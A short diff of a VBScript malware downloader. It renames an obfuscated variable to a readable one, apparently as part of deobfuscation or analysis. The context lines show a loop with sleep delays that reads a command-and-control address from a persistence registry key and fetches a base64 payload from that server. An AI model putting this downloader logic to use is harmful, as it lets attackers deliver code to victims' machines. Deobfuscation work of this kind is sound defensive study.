@@ -249,7 +249,7 @@ End Function
 '======= Script Start ========
 
 
-Set naiveP6u = CreateObject(OBJ_WSCRIPT_SHELL)
+Set WscriptShellObj = CreateObject(OBJ_WSCRIPT_SHELL)
 LOOP_MAX = 20347
 loopCounter = 87
 SLEEP_AFTER_EXECUTION = 204762
@@ -315,7 +315,7 @@ do while loopCounter < LOOP_MAX
         SleepMs 11551
 
         
-        registryStoredC2 = naiveP6u.RegRead(REGKEY_PERSISTENCE)
+        registryStoredC2 = WscriptShellObj.RegRead(REGKEY_PERSISTENCE)
         rawPayloadBase64 = FetchC2Payload(registryStoredC2 & "/" & GenerateRandomFilename)
 
 
